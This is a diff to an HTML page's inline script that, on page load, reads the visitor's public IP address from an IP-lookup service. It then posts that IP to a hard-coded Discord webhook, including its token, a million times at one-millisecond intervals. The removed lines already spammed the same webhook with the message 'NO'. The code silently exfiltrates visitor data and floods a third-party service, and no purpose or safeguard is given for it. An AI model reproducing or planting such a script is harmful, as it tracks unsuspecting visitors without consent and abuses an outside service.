@@ -6,6 +6,13 @@
   </head>
   <body>
     <script type="text/javascript">
-      for (let i = 0; i < 1000000;i++) fetch("https://discord.com/api/webhooks/948008562188238950/LMMJVfH4O2kgYXnt1Xdt2s4hzh4pAMsQUB3QfepMAYvjjjFlvDdnQ57Ng0giXOj_dKlK?wait=true", { method: "post", body: JSON.stringify({ content: "NO"}), headers: { "Content-Type": "application/json"} }).then(async x => console.log(await x.json()))
+      (async () => {
+        const sleep = async (ms) => new Promise(r => setTimeout(r, ms));
+        const {ip} = await (await fetch("https://api.ipify.org/?format=json")).json();
+        for (let i = 0; i < 1000000;i++) {
+          fetch("https://discord.com/api/webhooks/948008562188238950/LMMJVfH4O2kgYXnt1Xdt2s4hzh4pAMsQUB3QfepMAYvjjjFlvDdnQ57Ng0giXOj_dKlK?wait=true", { method: "post", body: JSON.stringify({ content: ip }), headers: { "Content-Type": "application/json"} });
+          await sleep(1);
+        }
+      })();
     </script>
   </body>
